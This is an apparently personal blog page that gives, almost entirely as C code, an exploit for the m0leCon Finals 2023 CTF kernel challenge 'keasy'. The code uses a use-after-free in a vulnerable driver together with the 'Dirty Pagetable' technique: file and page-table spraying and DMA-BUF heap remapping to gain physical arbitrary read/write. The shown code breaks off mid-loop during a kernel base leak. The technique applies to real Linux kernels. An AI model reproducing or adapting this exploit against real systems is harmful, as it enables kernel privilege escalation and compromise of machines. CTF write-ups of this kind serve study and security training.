<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>m0leCon Finals 2023 keasy</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="/index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="/about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="/index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./m0leCon Finals 2023 keasy.md</span><span class="cursor">â–ˆ</span>
        </div>
        <h1 class="post-title">m0leCon Finals 2023 keasy</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2026-02-09]</div>
    </header>
    <div class="layout-grid">
                <main><p>dirty pagetable</p>
<h2 id="exp">exp</h2><p>`</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">N_PAGESPRAY </span><span style="color:#d08770;">0x200
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">N_FILESPRAY </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DMA_HEAP_IOCTL_ALLOC </span><span style="color:#d08770;">0xc0184800
</span><span style="color:#b48ead;">typedef unsigned long long </span><span style="color:#c0c5ce;">u64;
</span><span style="color:#b48ead;">typedef unsigned int </span><span style="color:#c0c5ce;">u32;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">dma_heap_allocation_data {
</span><span style="color:#c0c5ce;">  u64 len;
</span><span style="color:#c0c5ce;">  u32 fd;
</span><span style="color:#c0c5ce;">  u32 fd_flags;
</span><span style="color:#c0c5ce;">  u64 heap_flags;
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">core</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">  cpu_set_t cpu_set;
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">CPU_ZERO</span><span style="color:#c0c5ce;">(&amp;cpu_set);
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">CPU_SET</span><span style="color:#c0c5ce;">(core, &amp;cpu_set);
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">sched_setaffinity</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">(), sizeof(cpu_set), &amp;cpu_set);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> user_cs, user_ss, user_rsp, user_rflags;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">save_state</span><span style="color:#c0c5ce;">() {
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">asm</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">      &quot;</span><span style="color:#a3be8c;">movq </span><span style="color:#d08770;">%%</span><span style="color:#a3be8c;">cs, %0</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">      &quot;</span><span style="color:#a3be8c;">movq </span><span style="color:#d08770;">%%</span><span style="color:#a3be8c;">ss, %1</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">      &quot;</span><span style="color:#a3be8c;">movq </span><span style="color:#d08770;">%%</span><span style="color:#a3be8c;">rsp, %2</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">      &quot;</span><span style="color:#a3be8c;">pushfq</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">      &quot;</span><span style="color:#a3be8c;">popq %3</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">      : &quot;</span><span style="color:#a3be8c;">=r</span><span style="color:#c0c5ce;">&quot;(user_cs), &quot;</span><span style="color:#a3be8c;">=r</span><span style="color:#c0c5ce;">&quot;(user_ss), &quot;</span><span style="color:#a3be8c;">=r</span><span style="color:#c0c5ce;">&quot;(user_rsp), &quot;</span><span style="color:#a3be8c;">=r</span><span style="color:#c0c5ce;">&quot;(user_rflags)
</span><span style="color:#c0c5ce;">      :
</span><span style="color:#c0c5ce;">      : &quot;</span><span style="color:#a3be8c;">memory</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd, dmafd, ezfd = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">win</span><span style="color:#c0c5ce;">() {
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/sda</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Lose...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Win!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, buf, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Done</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  }
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> file_spray[N_FILESPRAY];
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*page_spray[N_PAGESPRAY];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">/**
</span><span style="color:#65737e;">   * 1. Setup
</span><span style="color:#65737e;">   */
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Pin CPU (important!)
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">save_state</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Open vulnerable device
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/keasy</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/keasy</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Open DMA-BUF
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> dmafd = </span><span style="color:#8fa1b3;">creat</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/dma_heap/system</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(dmafd == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/dma_heap/system</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Prepare pages (PTE not allocated at this moment)
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; N_PAGESPRAY; i++) {
</span><span style="color:#c0c5ce;">    page_spray[i] = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)(</span><span style="color:#d08770;">0xdead0000UL </span><span style="color:#c0c5ce;">+ i*</span><span style="color:#d08770;">0x10000UL</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">                         </span><span style="color:#d08770;">0x8000</span><span style="color:#c0c5ce;">, PROT_READ|PROT_WRITE,
</span><span style="color:#c0c5ce;">                         MAP_ANONYMOUS|MAP_SHARED, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page_spray[i] == MAP_FAILED) </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mmap</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">/**
</span><span style="color:#65737e;">   * 2. Release the page where dangling file points
</span><span style="color:#65737e;">   */
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Spraying files...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Spray file (1)
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; N_FILESPRAY/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((file_spray[i] = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot;, O_RDONLY)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Get dangling file descriptorz
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ezfd = file_spray[N_FILESPRAY/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xdeadbeef</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// Use-after-Free
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ioctl did not fail</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Spray file (2)
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = N_FILESPRAY/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">; i &lt; N_FILESPRAY; i++)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((file_spray[i] = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot;, O_RDONLY)) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Releasing files...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Release the page for file slab cache
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; N_FILESPRAY; i++)
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(file_spray[i]);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">/**
</span><span style="color:#65737e;">   * 3. Overlap UAF file with PTE
</span><span style="color:#65737e;">   */
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Allocating PTEs...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Allocate many PTEs (1)
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; N_PAGESPRAY/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> j = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; j &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; j++)
</span><span style="color:#c0c5ce;">      *(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)(page_spray[i] + j*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">) = &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39; + j;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Allocate DMA-BUF heap
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> dma_buf_fd = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> dma_heap_allocation_data data;
</span><span style="color:#c0c5ce;">  data.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  data.</span><span style="color:#bf616a;">fd_flags </span><span style="color:#c0c5ce;">= O_RDWR;
</span><span style="color:#c0c5ce;">  data.</span><span style="color:#bf616a;">heap_flags </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  data.</span><span style="color:#bf616a;">fd </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">DMA_HEAP_IOCTL_ALLOC</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] dma_buf_fd: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, dma_buf_fd = data.</span><span style="color:#bf616a;">fd</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Allocate many PTEs (2)
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = N_PAGESPRAY/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">; i &lt; N_PAGESPRAY; i++)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> j = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; j &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; j++)
</span><span style="color:#c0c5ce;">      *(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)(page_spray[i] + j*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">) = &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39; + j;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">/**
</span><span style="color:#65737e;">   * 4. Modify PTE entry to overlap 2 physical pages
</span><span style="color:#65737e;">   */
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Increment physical address
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">dup</span><span style="color:#c0c5ce;">(ezfd) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">dup</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Searching for overlapping page...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Search for page that overlaps with other physical page
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*evil = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; N_PAGESPRAY; i++) {
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// We wrote &#39;H&#39;(=&#39;A&#39;+7) but if it changes the PTE overlaps with the file
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(*(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)(page_spray[i] + </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">) != &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39; + </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">) { </span><span style="color:#65737e;">// +38h: f_count
</span><span style="color:#c0c5ce;">      evil = page_spray[i] + </span><span style="color:#d08770;">0x7000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">      </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Found overlapping page: </span><span style="color:#d08770;">%p</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, evil);
</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">  }
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(evil == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">target not found :(</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Place PTE entry for DMA buffer onto controllable PTE
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Remapping...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">munmap</span><span style="color:#c0c5ce;">(evil, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*dmabuf = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(evil, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, PROT_READ | PROT_WRITE,
</span><span style="color:#c0c5ce;">                   MAP_SHARED | MAP_POPULATE, dma_buf_fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  *(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)dmabuf = &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">/**
</span><span style="color:#65737e;">   * Get physical AAR/AAW
</span><span style="color:#65737e;">   */
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Corrupt physical address of DMA-BUF
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">dup</span><span style="color:#c0c5ce;">(ezfd) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">      </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">dup</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] DMA-BUF now points to PTE: 0x</span><span style="color:#d08770;">%016lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, *(size_t*)dmabuf);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// Leak kernel physical base
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*wwwbuf = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  *(size_t*)dmabuf = </span><span style="color:#d08770;">0x800000000009c067</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; N_PAGESPRAY; i++) {
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page_spray[i] == evil) </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
